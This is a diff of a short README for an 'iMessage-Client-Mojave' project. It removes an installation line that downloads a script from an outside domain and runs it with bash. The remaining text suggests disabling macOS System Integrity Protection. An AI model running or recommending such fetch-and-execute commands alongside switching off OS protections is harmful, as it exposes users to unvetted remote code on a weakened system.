@@ -1,4 +1,3 @@
-Installation: ```curl calhat.com/script2.txt > script2.txt; bash script2.txt;```
 # iMessage-Client-Mojave
 You may want to [disable rootless mode](https://www.macworld.co.uk/how-to/mac/how-turn-off-mac-os-x-system-integrity-protection-rootless-3638975/)
 
